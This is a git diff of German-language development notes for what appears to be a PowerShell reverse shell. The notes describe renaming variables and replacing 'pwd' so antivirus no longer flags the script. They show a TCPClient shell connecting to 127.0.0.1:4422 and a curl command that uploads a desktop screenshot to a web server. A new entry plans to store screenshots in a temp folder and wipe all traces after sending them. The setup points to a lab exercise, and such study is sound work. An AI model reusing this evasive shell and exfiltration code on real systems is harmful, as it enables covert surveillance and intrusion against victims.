@@ -45,7 +45,8 @@ $sendback2  = $sendback + "PS " + (pwd).Path + "> "
 "pwd": Gibt den aktuellen Pfad wieder. Es scheint, als ist "pwd" in diesem Kontext ein Signal für Schadsoftware/Skript. Alternative kann in Powershell der Befehl ```GET-Location``` ausgeführt werden.
 
 Durch Trial and Error ensteht der folgende angepasste Powershell-Code:
-```
+
+```powershell
 $hmGuXO='127.0.0.1'
 $port = 4422
 $client = New-Object System.Net.Sockets.TCPClient($hmGuXO,$port);
@@ -74,3 +75,20 @@ $client.Close()
 ```
 curl -X POST -F "file=@C:/Users/admin/Desktop/screenshot.png" http://127.0.0.1:5000/upload
 ```
+---
+29.01.: Code angepasst vom Server -> Screenshot wird in einem Temporären Ordner gespeichert
+
+Der erstelle Screenshot soll in einem temporären Ordner gespeichert werden. Nachdem der Screenshot an den Webserver geschickt wurde, sollen alle Spuren beseitigt werden. 
+```cmd
+if(-not(Test-Path -Path "$env:TEMP\screenshot")){mkdir $env:TEMP\screenshot}
+```
+Die "normal" gestartete Powershell hat nicht die Berechtigung überall Ordner zu erstellen. Mit folgendem [dir](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir)-Befehl werden Ordner aufgelistet, die eine "write"-Berechtigung besitzen:
+```cmd
+dir /ad-r
+```
+/a[[:]<attributes>]	Displays only the names of those directories and files with your specified attributes. If you don't use this parameter, the command displays the names of all files except hidden and system files. If you use this parameter without specifying any attributes, the command displays the names of all files, including hidden and system files. The list of possible attributes values are:
+
+- d: Directories
+- r: Read-only files
+  
+You can use any combination of these values, but don't separate your values using spaces. Optionally you can use a colon (:) separator, or you can use a hyphen (-) as a prefix to mean, "not". For example, using the -s attribute won't show the system files.
